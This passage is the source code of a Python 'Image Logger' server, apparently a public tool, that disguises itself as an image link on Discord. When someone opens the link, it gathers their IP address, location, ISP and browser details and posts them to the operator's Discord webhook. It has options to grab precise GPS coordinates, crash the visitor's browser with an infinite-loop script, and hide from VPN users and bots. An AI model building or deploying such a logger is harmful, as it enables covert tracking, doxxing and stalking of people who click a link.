                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
